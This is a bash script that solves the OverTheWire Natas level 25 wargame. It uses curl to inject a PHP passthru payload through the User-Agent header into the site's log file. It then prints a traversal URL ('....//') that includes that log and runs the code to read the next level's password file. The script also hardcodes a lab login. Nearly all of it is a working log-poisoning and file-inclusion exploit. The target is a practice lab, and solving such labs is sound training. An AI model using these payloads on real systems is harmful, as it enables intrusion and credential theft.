#!/bin/bash

SESSID="foobar"

curl  -u natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c \
      -A "<?php passthru('cat /etc/natas_webpass/natas26') ?>" \
      -b "PHPSESSID=$SESSID" \
      -d "lang=../" \
      http://natas25.natas.labs.overthewire.org/

echo sessid is $SESSID

echo check "http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//www/natas/natas25/logs/natas25_$SESSID.log"

